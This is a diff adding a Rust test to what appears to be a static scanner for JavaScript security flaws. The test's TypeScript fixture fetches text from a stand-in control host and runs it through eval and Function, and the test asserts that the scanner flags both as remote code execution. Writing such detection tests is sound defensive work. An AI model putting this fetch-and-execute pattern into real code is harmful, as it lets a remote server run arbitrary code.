@@ -631,6 +631,30 @@ fn cross_file_response_decode_reaches_computed_function() {
 }
 
 #[test]
+fn optional_chained_response_properties_reach_dynamic_execution() {
+    let root = temporary_directory("optional-response-flow");
+    fs::write(
+        root.join("main.ts"),
+        b"async function start() { const response = await fetch('https://example.invalid/control'); eval(await response?.text?.()); }\nasync function startComputed() { const response = await fetch('https://example.invalid/control'); const code = await response?.['text']?.(); Function(code)(); }\nstart(); startComputed();",
+    )
+    .unwrap();
+
+    let output = run(&[root.to_str().unwrap(), "--format=json"]);
+
+    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
+    assert_eq!(
+        report["findings"]
+            .as_array()
+            .unwrap()
+            .iter()
+            .filter(|finding| finding["id"] == "JS-REMOTE-CODE-EXECUTION")
+            .count(),
+        2
+    );
+    fs::remove_dir_all(root).unwrap();
+}
+
+#[test]
 fn html_inline_and_external_scripts_enter_the_execution_graph() {
     let root = temporary_directory("html-scripts");
     fs::write(
